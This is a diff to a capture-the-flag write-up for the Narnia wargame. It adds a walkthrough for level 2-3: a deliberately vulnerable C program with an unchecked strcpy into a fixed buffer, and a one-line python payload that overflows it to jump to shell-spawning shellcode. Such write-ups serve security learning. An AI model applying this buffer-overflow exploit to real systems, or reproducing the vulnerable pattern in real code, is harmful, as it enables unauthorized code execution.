@@ -42,7 +42,7 @@ The reason cat is used is to keep open the shell as without it the shell will cl
 
 
 Level 1 - 2
-This is the second challenge in the Narnia series and after ssh' ing into the challenge the is a file , the source
+This is the second challenge in the Narnia series and after ssh' ing into the challenge there is a file , the source
 code fo the file which is gotten by running cat against the file is below -
 
 #include <stdio.h>
@@ -73,3 +73,36 @@ export EGG=$(python -c'print
 There is also a fairly similar perl solution available but I am not that familiar with perl. There is also
 a great tutorial on shellcode at
 https://evilzone.org/tutorials/writing-shellcode-for-32-bit-linux-from-the-ground-up/
+
+
+
+Level 2 - 3
+In this the 3rd of the Narnia series of challenges there is once again a c file which must be exploited. The source
+code for the file is this
+
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+ 
+int main(int argc, char * argv[]){
+char buf[128];
+ 
+if(argc == 1){
+printf("Usage: %s argument\n", argv[0]);
+exit(1);
+}
+strcpy(buf,argv[1]);
+printf("%s", buf);
+ 
+return 0;
+}
+
+Once again from a first look the file looks as though there is going to be a buffer overflow vulnerability that
+is present. Once again the usual methods of checking for various addresses is used like in previous examples or
+in other challenge sets. Next up as per other examples if seeing how much code needs to be injected in order for
+in this case the buf[] to be overwritten with shellcode that is shell-spawning. In this case there are 140 bytes
+that are needed to overwrite the retrun address. The solution is below
+
+python -c "print '\x41'*140 + '\xfd\xd8\xff\xff'"
+
+The 140 characters and the shellcode address sent in with appropriate formating for endiannesss.
